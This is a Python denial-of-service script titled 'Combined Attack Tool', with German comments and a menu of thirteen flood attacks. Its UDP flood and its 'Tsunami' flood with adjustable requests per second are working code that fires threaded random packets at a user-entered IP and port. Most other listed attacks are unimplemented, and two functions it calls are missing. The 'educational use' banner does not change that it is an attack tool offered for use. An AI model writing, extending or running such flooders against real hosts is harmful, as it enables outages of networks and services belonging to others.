import os
import sys
import socket
import random
import time
from termcolor import colored
from threading import Thread, Lock

# Farbpalette für den Text
COLORS = {
    "banner": "red",
    "menu": "yellow",
    "info": "cyan",
    "success": "green",
    "warning": "blue",
    "error": "red"
}

def set_color(key, new_color):
    """Passt die Farben im Farbschema an."""
    if key in COLORS:
        COLORS[key] = new_color
    else:
        print(colored("Ungültiger Farbschlüssel.", COLORS["error"]))

# Banner anzeigen
def show_banner():
    os.system("clear")
    print(colored("""
    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║
   ███████║   ██║      ██║   ███████║██║     ███████║
   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║
   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """, COLORS["banner"]))
    print(colored("*******************************************", COLORS["menu"]))
    print(colored("*            Combined Attack Tool         *", COLORS["menu"]))
    print(colored("*         Created for Educational Use     *", COLORS["menu"]))
    print(colored("*******************************************", COLORS["menu"]))
    print(colored("Author: Educational Example", COLORS["success"]))
    print(colored("Usage of this tool must comply with all laws.", COLORS["warning"]))
    print()

# Helper Functions
def get_target_info():
    ip = input(colored("Enter target IP: ", COLORS["info"]))
    port = int(input(colored("Enter target port (0 if not applicable): ", COLORS["info"])))
    duration = int(input(colored("Enter attack duration (seconds): ", COLORS["info"])))
    return ip, port, duration

def get_threads():
    threads = int(input(colored("Enter number of threads (Max: 100): ", COLORS["info"])))
    return min(threads, 100)

def get_packet_size():
    packet_size = int(input(colored("Enter packet size in bytes (Max: 65507): ", COLORS["info"])))
    return min(packet_size, 65507)

# Universal Attack Function
def execute_attack(ip, port, duration, threads, attack_type, payload=None):
    lock = Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        sock_type = socket.SOCK_DGRAM if attack_type in ["udp", "chargen"] else socket.SOCK_RAW
        sock = socket.socket(socket.AF_INET, sock_type)
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                data = payload or random._urandom(1024)
                sock.sendto(data, (ip, port))
                with lock:
                    stats["packets_sent"] += 1
            except Exception:
                continue

    print(colored(f"Starting {attack_type.upper()} attack on {ip}:{port}", COLORS["menu"]))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    while any(thread.is_alive() for thread in threads_list):
        with lock:
            print(colored(f"Packets sent: {stats['packets_sent']}", COLORS["info"]), end="\r")
        time.sleep(1)

    for thread in threads_list:
        thread.join()
    print(colored(f"\n{attack_type.upper()} attack completed.", COLORS["success"]))

# Neuer Tsunami-Angriff mit anpassbaren RPS
def tsunami_attack(ip, port, duration, threads):
    lock = Lock()
    stats = {"requests_sent": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        rps = int(input(colored("Enter requests per second (RPS, Max: 10000): ", COLORS["info"])))
        rps = min(rps, 10000)

        while time.time() < timeout:
            try:
                data = random._urandom(1024)
                for _ in range(rps):
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                        sock.sendto(data, (ip, port))
                        with lock:
                            stats["requests_sent"] += 1
            except Exception:
                continue

    print(colored(f"Starting TSUNAMI attack on {ip}:{port} with RPS adjustment.", COLORS["menu"]))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"\nTSUNAMI attack completed. Requests sent: {stats['requests_sent']}", COLORS["success"]))

# Main Menu
def main():
    while True:
        show_banner()
        print(colored("1. UDP Flood", COLORS["menu"]))
        print(colored("2. ICMP Flood", COLORS["menu"]))
        print(colored("3. SYN Flood", COLORS["menu"]))
        print(colored("4. CharGEN Flood", COLORS["menu"]))
        print(colored("5. NTP Amplification", COLORS["menu"]))
        print(colored("6. Smurf Attack", COLORS["menu"]))
        print(colored("7. Ping of Death", COLORS["menu"]))
        print(colored("8. Slowloris", COLORS["menu"]))
        print(colored("9. HTTP Flood", COLORS["menu"]))
        print(colored("10. RUDY Attack", COLORS["menu"]))
        print(colored("11. Bandwidth Exhaustion", COLORS["menu"]))
        print(colored("12. Advanced Persistent DoS (APDoS)", COLORS["menu"]))
        print(colored("13. Tsunami Attack (Custom RPS)", COLORS["menu"]))
        print(colored("14. Exit", COLORS["menu"]))

        choice = input(colored("Select an option: ", COLORS["info"]))

        if choice in map(str, range(1, 14)):
            ip, port, duration = get_target_info()
            threads = get_threads()

            if choice == "1":
                execute_attack(ip, port, duration, threads, "udp")
            elif choice == "2":
                icmp_flood(ip, duration, threads)
            elif choice == "3":
                syn_flood(ip, port, duration, threads)
            elif choice == "13":
                tsunami_attack(ip, port, duration, threads)
        elif choice == "14":
            print(colored("Exiting... Goodbye!", COLORS["error"]))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", COLORS["error"]))

if __name__ == "__main__":
    main()
